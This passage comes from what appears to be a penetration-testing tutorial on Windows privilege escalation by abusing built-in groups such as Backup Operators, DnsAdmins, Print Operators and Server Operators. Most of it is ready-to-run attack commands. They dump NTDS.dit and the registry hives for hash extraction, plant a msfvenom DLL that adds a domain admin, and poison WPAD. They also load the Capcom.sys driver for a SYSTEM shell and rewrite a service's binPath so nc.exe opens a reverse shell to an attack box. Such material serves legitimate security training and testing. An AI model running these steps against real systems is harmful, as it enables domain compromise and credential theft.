<p>If we are a member of the <code>Backup Operators</code> group, we are granted <code>SeBackup</code> and <code>SeRestore</code> privileges. With <code>SeBackupPrivilege</code>, we can traverse any folder and list the folder contents. If we want to copy a file from a folder with no ACE present for us however, we can&#39;t just do it with regular commands: it need to be done with a program specifying the <code>FILE_FLAG_BACKUP_SEMANTICS</code> flag. We can use this <a href="https://github.com/giuliano108/SeBackupPrivilege" rel="nofollow">script</a> for this purpose. Keep in mind that if we are explicitely denied access to a file or folder (or if our group is), we won&#39;t be able to access it despite our privileges:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Import the DLLs found in repository:</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\SeBackupPrivilegeUtils.dll</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\SeBackupPrivilegeCmdLets.dll</span><span class="w">

</span><span class="c"># Verify first that SeBackupPrivilege is enabled,</span><span class="w">
</span><span class="c"># from an elevated prompt:</span><span class="w">
</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">

</span><span class="c"># Or alternatively in powershell:</span><span class="w">
</span><span class="n">Get-SeBackupPrivilege</span><span class="w">

</span><span class="c"># If disabled, enable it with:</span><span class="w">
</span><span class="n">Set-SeBackupPrivilege</span><span class="w">

</span><span class="c"># And check again:</span><span class="w">
</span><span class="n">Get-SeBackupPrivilege</span><span class="w">

</span><span class="c"># We can now copy any file we want:</span><span class="w">
</span><span class="n">Copy-FileSeBackupPrivilege</span><span class="w"> </span><span class="s1">'C:\&lt;file path&gt;'</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&lt;</span><span class="nx">destination</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<p>If we are a member of this group, we can also log in to a domain controller. This is a very attractive opportunity as we could extract the AD database <code>NTDS.dit</code>, which contains all the NTLM hashes for all user and computer objects in domain.</p>

<p>Because this file is locked to unprivileged users, we can use Windows&#39; <code>diskshadow</code> tool to create a shadow copy of the C drive and expose it as the E drive. Since the <code>NTDS.dit</code> in the shadow copy won&#39;t be used by the system, we&#39;ll be able to access it.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Run diskshadow.exe:</span><span class="w">
</span><span class="n">diskshadow.exe</span><span class="w">

</span><span class="c"># In diskshadow prompt,</span><span class="w">
</span><span class="c"># run the following:</span><span class="w">
</span><span class="n">set</span><span class="w"> </span><span class="nx">verbose</span><span class="w"> </span><span class="nx">on</span><span class="w">
</span><span class="n">set</span><span class="w"> </span><span class="nx">metadata</span><span class="w"> </span><span class="nx">C:\Windows\Temp\meta.cab</span><span class="w">
</span><span class="n">set</span><span class="w"> </span><span class="nx">context</span><span class="w"> </span><span class="nx">clientaccessible</span><span class="w">
</span><span class="n">set</span><span class="w"> </span><span class="nx">context</span><span class="w"> </span><span class="nx">persistent</span><span class="w">
</span><span class="kr">begin</span><span class="w"> </span><span class="n">backup</span><span class="w">
</span><span class="nx">add</span><span class="w"> </span><span class="nx">volume</span><span class="w"> </span><span class="nx">C:</span><span class="w"> </span><span class="nx">alias</span><span class="w"> </span><span class="nx">cdrive</span><span class="w">
</span><span class="n">create</span><span class="w">
</span><span class="nx">expose</span><span class="w"> </span><span class="o">%</span><span class="nx">cdrive</span><span class="o">%</span><span class="w"> </span><span class="nx">E:</span><span class="w">
</span><span class="kr">end</span><span class="w"> </span><span class="n">backup</span><span class="w">
</span><span class="nx">exit</span><span class="w">

</span><span class="c"># Check if the shadow copy has been created:</span><span class="w">
</span><span class="n">dir</span><span class="w"> </span><span class="nx">E:</span><span class="w">

</span><span class="c"># Bypass the ACL and copy NTDS.dit locally:</span><span class="w">
</span><span class="n">Copy-FileSeBackupPrivilege</span><span class="w"> </span><span class="nx">E:\Windows\NTDS\ntds.dit</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&lt;</span><span class="nx">destination</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<p>If we want to eliminate the need of external tools, we can also use <code>robocopy</code> to copy files, NTDS.dit in this case:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Copy NTDS.dit parent directory</span><span class="w">
</span><span class="n">robocopy</span><span class="w"> </span><span class="nx">/B</span><span class="w"> </span><span class="nx">E:\Windows\NTDS</span><span class="w"> </span><span class="nx">ntds</span><span class="w">
</span></code></pre></div>

<p>To extract all AD account credentials from NTDS.dit, we can either use powershell&#39;s <a href="https://github.com/MichaelGrafnetter/DSInternals" rel="nofollow">DSInternals</a> module or secretsdump.py, from our attack box:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Extraction with DSInternals:</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\DSInternals.psd1</span><span class="w">
</span><span class="nv">$key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-BootKey</span><span class="w"> </span><span class="nt">-SystemHivePath</span><span class="w"> </span><span class="o">.</span><span class="nx">\SYSTEM</span><span class="w">
</span><span class="n">Get-ADDBAccount</span><span class="w"> </span><span class="nt">-DistinguishedName</span><span class="w"> </span><span class="s1">'CN=administrator,CN=users,DC=&lt;DC name&gt;,DC=&lt;DC domain&gt;'</span><span class="w"> </span><span class="nt">-DBPath</span><span class="w"> </span><span class="o">.</span><span class="nx">\ntds.dit</span><span class="w"> </span><span class="nt">-BootKey</span><span class="w"> </span><span class="nv">$key</span><span class="w">
</span></code></pre></div><div class="highlight"><pre class="highlight shell"><code><span class="c"># Extraction with secretsdump.py:</span>
secretsdump.py <span class="nt">-ntds</span> ntds.dit <span class="nt">-system</span> SYSTEM <span class="nt">-hashes</span> lmhash:nthash LOCAL
</code></pre></div>

<p>We can also backup the SAM and SYSTEM registry hives if we are a member of the Backup Operators group. Once downloaded in our attack box, we can extract local account credentials from them with <code>secretsdump.py</code>:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Back up SAM, SYSTEM and SECURITY registry hives</span><span class="w">
</span><span class="c"># in current location:</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">HKLM\SYSTEM</span><span class="w"> </span><span class="nx">SYSTEM.SAV</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">HKLM\SAM</span><span class="w"> </span><span class="nx">SAM.SAV</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">HKLM\SECURITY</span><span class="w"> </span><span class="nx">SECURITY.SAV</span><span class="w">

</span><span class="c"># Extract credentials from our attack box:</span><span class="w">
</span><span class="n">secretsdump.py</span><span class="w"> </span><span class="nt">-sam</span><span class="w"> </span><span class="nx">SAM.SAV</span><span class="w"> </span><span class="nt">-system</span><span class="w"> </span><span class="nx">SYSTEM.SAV</span><span class="w"> </span><span class="nt">-security</span><span class="w"> </span><span class="nx">SECURITY.SAV</span><span class="w"> </span><span class="nx">LOCAL</span><span class="w">
</span></code></pre></div>

<h3>Leveraging Event Log Readers group</h3>

<p>To help monitoring and identify suspicious behavior, an organization might enable <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-process-creation" rel="nofollow">audit process creation</a> to log all processes starting on the system. It is saved to the Windows security event log as event ID <code>4688: A new process has been created</code>, and may be forwarded to a SIEM or other monitoring tools. Suspicious activity might then be flagged, if <a href="https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html" rel="nofollow">common commands</a> ran by attackers are detected.</p>

<p>Besides sysadmins, some users like developers might be added to the Event Log Readers group for certain tasks or monitoring processes. If auditing of process command lines is enabled and our current user is a member of this group, we might be able to extract credentials as many commands support passing password as parameters.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Check if we are a member of the Event Log Readers group:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w"> </span><span class="s2">"Event Log Readers"</span><span class="w">

</span><span class="c"># Search security logs for parameters passed in '/user' flags:</span><span class="w">
</span><span class="n">wevtutil</span><span class="w"> </span><span class="nx">qe</span><span class="w"> </span><span class="nx">Security</span><span class="w"> </span><span class="nx">/rd:true</span><span class="w"> </span><span class="nx">/f:text</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-String</span><span class="w"> </span><span class="s2">"/user"</span><span class="w">

</span><span class="c"># Same search, but passing credentials to query from another</span><span class="w">
</span><span class="c"># user:</span><span class="w">
</span><span class="n">wevtutil</span><span class="w"> </span><span class="nx">qe</span><span class="w"> </span><span class="nx">Security</span><span class="w"> </span><span class="nx">/rd:true</span><span class="w"> </span><span class="nx">/f:text</span><span class="w"> </span><span class="nx">/r:share01</span><span class="w"> </span><span class="nx">/u:</span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/p:</span><span class="err">&lt;</span><span class="nx">password</span><span class="err">&gt;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"/user"</span><span class="w">
</span></code></pre></div>

<p>We might also use Get-WinEvent with powershell, but this also requires admin access or proper permissions on the <code>HKLM\System\CurrentControlSet\Services\Eventlog\Security</code> registry key.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Same search with Get-WinEvent.</span><span class="w">
</span><span class="c"># We can also run it as another user</span><span class="w">
</span><span class="c"># With the -Credential flag.</span><span class="w">
</span><span class="n">Get-WinEvent</span><span class="w"> </span><span class="nt">-LogName</span><span class="w"> </span><span class="nx">security</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">where</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">ID</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="mi">4688</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="n">Properties</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span><span class="o">.</span><span class="nf">Value</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s1">'*/user*'</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="p">@{</span><span class="nx">name</span><span class="o">=</span><span class="s1">'CommandLine'</span><span class="p">;</span><span class="nx">expression</span><span class="o">=</span><span class="p">{</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="n">Properties</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span><span class="o">.</span><span class="nf">Value</span><span class="w"> </span><span class="p">}}</span><span class="w">
</span></code></pre></div>

<p><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.1" rel="nofollow">Powershell Operational log</a> is also accessible with no privileges required and might contain interesting info.</p>

<h3>Leveraging DnsAdmins group</h3>

<p>The DnsAdmins group allow its members to have access to DNS information on the network. Since the DNS service runs as <code>NT AUTHORITY\SYSTEM</code>, we might escalate our privileges if our initial user is a member of this group. When DNS is run on a Domain Controller, as that&#39;s commonly the case, the following attack can be performed:</p>

<ul>
<li>DNS management is performed over RPC.</li>
<li>We can load any custom DLL with no verification of the DLL&#39;s path, using <code>dnscmd</code> and leveraging <code>ServerLevelPluginDll</code>.</li>
<li>When we run this command with <code>dnscmd</code>, this will populate the <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll</code> registry key.</li>
<li>Restarting the DNS service will load the DLL.</li>
<li>Custom DLL will contain and run our payload to get a privileged reverse shell, or load mimikatz, or something else.</li>
</ul>

<p>More info about this attack can be found <a href="https://adsecurity.org/?p=4064" rel="nofollow">here</a>. Restarting the DNS service could take down DNS for the entire Active Directory environment, so this is <em>not</em> an attack we should take lightly. Always make sure you have permission to perform it.</p>

<p>From our attack box, let&#39;s do the following:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Generate a malicious DLL that will add a netadm</span>
<span class="c"># user in domain admins group:</span>
msfvenom <span class="nt">-p</span> windows/x64/exec <span class="nv">cmd</span><span class="o">=</span><span class="s1">'net group "domain admins" netadm /add /domain'</span> <span class="nt">-f</span> dll <span class="nt">-o</span> hacky.dll

<span class="c"># Start a Python HTTP server to transfer the DLL:</span>
python3 <span class="nt">-m</span> http.server 4444
</code></pre></div>

<p>Then, from our target, with an elevated prompt:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Confirm we are a member of the DnsAdmins group:</span><span class="w">
</span><span class="n">Get-ADGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">DnsAdmins</span><span class="w">

</span><span class="c"># Download the DLL:</span><span class="w">
</span><span class="n">wget</span><span class="w"> </span><span class="s2">"http://&lt;attack box IP&gt;:&lt;attack box port&gt;/hacky.dll"</span><span class="w"> </span><span class="nt">-outfile</span><span class="w"> </span><span class="s2">"hacky.dll"</span><span class="w">

</span><span class="c"># Load the DLL as a member of the DnsAdmins group.</span><span class="w">
</span><span class="c"># It is required to specify the absolute path of</span><span class="w">
</span><span class="c"># our DLL:</span><span class="w">
</span><span class="n">dnscmd.exe</span><span class="w"> </span><span class="nx">/config</span><span class="w"> </span><span class="nx">/serverlevelplugindll</span><span class="w"> </span><span class="nx">C:\Users\netadm\Desktop\hacky.dll</span><span class="w">

</span><span class="c"># Find our user's SID:</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">useraccount</span><span class="w"> </span><span class="nx">where</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="err">`</span><span class="s2">"&lt;username&gt;</span><span class="se">`"</span><span class="s2"> get sid

# Check permissions on DNS service with our user's SID.
# Look for "</span><span class="n">RPWP</span><span class="s2">" string to ensure we have SERVICE_START
# and SERVICE_STOP permissions:
sc.exe sdshow DNS

# If we do, stop the DNS service:
sc.exe stop dns

# Start DNS service back again.
# It will fail to start correctly but
# will load our DLL:
sc.exe start dns

# Check if everything worked and our user
# has been added to the Domain Admins group:
net group "</span><span class="nx">Domain</span><span class="w"> </span><span class="nx">Admins</span><span class="s2">" /dom

# Confirm that the ServerLevelPluginDll registry
# key has been added:
reg query \\&lt;target IP&gt;\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

# Once we're done with our payload, delete the
# registry key:
reg delete \\&lt;target IP&gt;\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll

# Start DNS service once again:
sc.exe start dns

# Check that DNS service is working
# as it was before our attack:
sc.exe query dns
</span></code></pre></div>

<p>Another attack leveraging the DnsAdmins group would be using <code>mimilib.dll</code> from gentilkiwi, as described <a href="http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html" rel="nofollow">here</a>.</p>

<p>Another possible attack is to create Web Proxy Auto-Discovery Protocol (WPAD) record. Being part of this group gives us the ability to disable global query block security, which would block this attack. By creating this record, every machine running WPAD with default settings can have its traffic proxied to our attack box. From there, we could use responder or inveigh to spoof traffic and gather hashes and credentials.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Disable the global query block list:</span><span class="w">
</span><span class="n">Set-DnsServerGlobalQueryBlockList</span><span class="w"> </span><span class="nt">-Enable</span><span class="w"> </span><span class="bp">$false</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">full</span><span class="w"> </span><span class="nx">DC</span><span class="w"> </span><span class="nx">address</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># Add a WPAD record proxying to our attack box:</span><span class="w">
</span><span class="n">Add-DnsServerResourceRecordA</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">wpad</span><span class="w"> </span><span class="nt">-ZoneName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">DC</span><span class="w"> </span><span class="nx">domain</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">full</span><span class="w"> </span><span class="nx">DC</span><span class="w"> </span><span class="nx">address</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-IPv4Address</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">attack</span><span class="w"> </span><span class="nx">box</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<h3>Leveraging Print Operators group</h3>

<p>The Print Operators group is another group we can use to escalate our privileges. The interesting permission it grants is <code>SeLoadDriverPrivilege</code>, but this permission might not be readily available from <code>whoami /priv</code>. If it isn&#39;t, it means we will have to either validate our credentials through the UAC or bypass it as shown in <a href="https://github.com/hfiref0x/UACME" rel="nofollow">this repo</a>. It&#39;s also not exploitable after Windows 10 Version 1803.</p>

<p>If we re-run <code>whoami /priv</code> and finally see the <code>SeLoadDriverPrivilege</code> permission, we can get going. We can load the <code>Capcom.sys</code> driver, that will allow us to run shellcode with <code>SYSTEM</code> privileges.</p>

<p><a href="https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp" rel="nofollow">This PoC</a> will both enable the <code>SeLoadDriverPrivilege</code> and leverage the <code>Capcom.sys</code> driver for us, but it needs to be updated. Replace the includes present with the following:</p>

<div class="highlight"><pre class="highlight c"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;assert.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;winternl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sddl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"tchar.h"</span><span class="cp">
</span></code></pre></div>

<p>Upload it on the target and compile it:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="n">cl</span><span class="w"> </span><span class="nx">/DUNICODE</span><span class="w"> </span><span class="nx">/D_UNICODE</span><span class="w"> </span><span class="nx">EnableSeLoadDriverPrivilege.cpp</span><span class="w">
</span></code></pre></div>

<p>Download the Capcom.sys driver <a href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys" rel="nofollow">here</a> in C:\Temp, and add a reference to the driver with the following commands:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="n">reg</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">HKCU\System\CurrentControlSet\CAPCOM</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">ImagePath</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/d</span><span class="w"> </span><span class="s2">"\??\C:\Temp\Capcom.sys"</span><span class="w">

</span><span class="n">reg</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">HKCU\System\CurrentControlSet\CAPCOM</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">Type</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_DWORD</span><span class="w"> </span><span class="nx">/d</span><span class="w"> </span><span class="nx">1</span><span class="w">
</span></code></pre></div>

<p>If <a href="http://www.nirsoft.net/utils/driverview.html" rel="nofollow">DriverView.exe</a> is present on the target, we can check that Capcom.sys isn&#39;t loaded so far:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Check Capcom.sys load status with DriverView.exe:</span><span class="w">
</span><span class="o">.</span><span class="n">\DriverView.exe</span><span class="w"> </span><span class="nx">/stext</span><span class="w"> </span><span class="nx">drivers.txt</span><span class="w">
</span><span class="n">cat</span><span class="w"> </span><span class="nx">drivers.txt</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-String</span><span class="w"> </span><span class="nt">-pattern</span><span class="w"> </span><span class="nx">Capcom</span><span class="w">

</span><span class="c"># Next, run the EnableSeLoadDriverPrivilege.exe we just compiled:</span><span class="w">
</span><span class="n">EnableSeLoadDriverPrivilege.exe</span><span class="w">

</span><span class="c"># Check again and ensure Capcom.sys is now loaded with DriverView.exe.</span><span class="w">
</span><span class="c"># If it is, download this repo and compile it with Visual Studio:</span><span class="w">
</span><span class="c"># https://github.com/tandasat/ExploitCapcom</span><span class="w">

</span><span class="c"># Run the exploit, and we should get a SYSTEM shell:</span><span class="w">
</span><span class="o">.</span><span class="n">\ExploitCapcom.exe</span><span class="w">
</span></code></pre></div>

<p>If we don&#39;t have access to a GUI for the spawned <code>SYSTEM</code> shell, we can change line 292 of <code>ExploitCapcom.cpp</code> to the following:</p>

<div class="highlight"><pre class="highlight cpp"><code><span class="n">TCHAR</span> <span class="n">CommandLine</span><span class="p">[]</span> <span class="o">=</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"C:</span><span class="se">\\</span><span class="s">Temp</span><span class="se">\\</span><span class="s">revshell.exe"</span><span class="p">);</span>
</code></pre></div>

<p>And upload a <code>revshell.exe</code> reverse shell in the according path, with a listener on our attack box to catch it.</p>

<p>If we want to automate all the steps of this exploit chain except for downloading and compiling <code>ExploitCapcom.exe</code>, we could also use <a href="https://github.com/TarlogicSecurity/EoPLoadDriver/" rel="nofollow">EoPLoadDriver</a>:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="n">EoPLoadDriver.exe</span><span class="w"> </span><span class="nx">System\CurrentControlSet\Capcom</span><span class="w"> </span><span class="nx">c:\Temp\Capcom.sys</span><span class="w">
</span></code></pre></div>

<p>To clean up after us, we need to remove the registry key we created:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="n">reg</span><span class="w"> </span><span class="nx">delete</span><span class="w"> </span><span class="nx">HKCU\System\CurrentControlSet\Capcom</span><span class="w">
</span></code></pre></div>

<h3>Leveraging Server Operators group</h3>

<p>The Server Operators group is highly privileged and an almost guaranteed path to privilege escalation. Members of this group can administer Windows servers without domain admin privileges, and can log locally to servers including domain controllers.</p>

<p>They can also administer local services and are granted <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code> privileges. With all those permissions, escalating our privileges becomes as easy as replacing a service&#39;s binary path with our payload and starting it to execute it. As long as the service is starting as <code>SYSTEM</code>, privilege escalation will work.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Check if a service is running as SYSTEM,</span><span class="w">
</span><span class="c"># for instance, AppReadiness:</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">qc</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">service</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># If we have access to the service control manager,</span><span class="w">
</span><span class="c"># list services we can modify:</span><span class="w">
</span><span class="nv">$services</span><span class="o">=</span><span class="p">(</span><span class="n">get-service</span><span class="p">)</span><span class="o">.</span><span class="nf">name</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="kr">foreach</span><span class="w"> </span><span class="p">{(</span><span class="n">Get-ServiceAcl</span><span class="w"> </span><span class="bp">$_</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">where</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">access</span><span class="o">.</span><span class="nf">IdentityReference</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'Server Operators'</span><span class="p">}}</span><span class="w">

</span><span class="c"># Otherwise if we don't known any</span><span class="w">
</span><span class="c"># service, list them and go blind:</span><span class="w">
</span><span class="n">services</span><span class="w">

</span><span class="c"># Use PsService from sysinternals</span><span class="w">
</span><span class="c"># with powershell to check if the Server</span><span class="w">
</span><span class="c"># Operators group has SERVICE_ALL_ACCESS</span><span class="w">
</span><span class="c"># set for the service, granting us full</span><span class="w">
</span><span class="c"># control over it:</span><span class="w">
</span><span class="o">.</span><span class="n">\PsService.exe</span><span class="w"> </span><span class="nx">security</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">service</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># Check members of local admin group:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w"> </span><span class="nx">Administrators</span><span class="w">

</span><span class="c"># Change the binary path with our payload:</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">service</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">binPath</span><span class="o">=</span><span class="w"> </span><span class="s2">"cmd /c net localgroup Administrators &lt;username&gt; /add"</span><span class="w">

</span><span class="c"># Alternative payload, with nc.exe uploaded on target:</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">service</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">binPath</span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\&lt;full path&gt;\nc.exe -e cmd.exe &lt;attack box IP&gt; &lt;attack box port&gt;"</span><span class="w">

</span><span class="c"># Best payload, which will ensure persistence even</span><span class="w">
</span><span class="c"># when the failing service timeouts:</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">service</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">binPath</span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\windows\system32\cmd.exe /c C:\&lt;full path&gt;\nc.exe -e cmd &lt;attack box IP&gt; &lt;attack box port&gt;"</span><span class="w">

</span><span class="c"># Stop service first:</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">service</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># Start service. This will of course fail,</span><span class="w">
</span><span class="c"># but our payload will get executed:</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">service</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># Confirm we are SYSTEM:</span><span class="w">
</span><span class="n">whoami</span><span class="w">

</span><span class="c"># If we added ourselves to the group, confirm that</span><span class="w">
</span><span class="c"># our payload worked:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w"> </span><span class="nx">Administrators</span><span class="w">

</span><span class="c"># Access the domain controller from our attack box:</span><span class="w">
</span><span class="n">nxc</span><span class="w"> </span><span class="nx">smb</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">DC</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">password</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># Retrieve NTLM password hashes on domain controller,</span><span class="w">
</span><span class="c"># from our attack box:</span><span class="w">
</span><span class="n">secretsdump.py</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;@&lt;</span><span class="nx">DC</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-just-dc-user</span><span class="w"> </span><span class="nx">administrator</span><span class="w">
</span></code></pre></div>

<h2>Escalating privileges with OS internals</h2>

<h3>Leveraging User Account Control</h3>

<p>UAC (User Account Control) is a consent prompt for elevated activites introduced in Windows Vista. When enabled, all applications run under the context of a non-administrator account, with limited privileges, unless an administrator explicitely authorizes some of them to run with administrator privileges.</p>

<p>This prevents unintended changes, but it&#39;s not a security boundary. We can check how UAC works in depth <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works" rel="nofollow">here</a>. UAC can be configured by administrators locally with <code>secpol.msc</code>, or via GPOs for a domain environment. All settings can be seen in detail <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings" rel="nofollow">here</a>.</p>

<p>Here are the 10 Group Policy settings that can be set for UAC, affecting the following registry keys:</p>

<ul>
<li>FilterAdministratorToken (disabled by default)</li>
<li>EnableUIADesktopToggle (disabled by default)</li>
<li>ConsentPromptBehaviorAdmin (prompt for non-Windows binaries)</li>
<li>ConsentPromptBehaviorUser (prompt for credentials on secure desktop)</li>
<li>EnableInstallerDetection (enabled for home, disabled for enterprise by default)</li>
<li>ValidateAdminCodeSignatures (disabled by default)</li>
<li>EnableSecureUIAPaths (enabled by default)</li>
<li>EnableLUA (enabled by default)</li>
<li>PromptOnSecureDesktop (enabled by default)</li>
<li>EnableVirtualization (enabled by default)</li>
</ul>

<p>UAC may not stop an attacker from gaining privileges, but it will slow us down and make us noiser / more noticeable in the process.</p>

<p>If our user has a privileged access token, permitting to run applications with elevated privileges once UAC is confirmed, we need to take advantage of that, but there is no CLI version of the GUI prompt. If all we have is a command-line inteface, we need to bypass the UAC.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Confirm if UAC is enabled:</span><span class="w">
</span><span class="n">REG</span><span class="w"> </span><span class="nx">QUERY</span><span class="w"> </span><span class="nx">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">EnableLUA</span><span class="w">

</span><span class="c"># If enabled, check its current level.</span><span class="w">
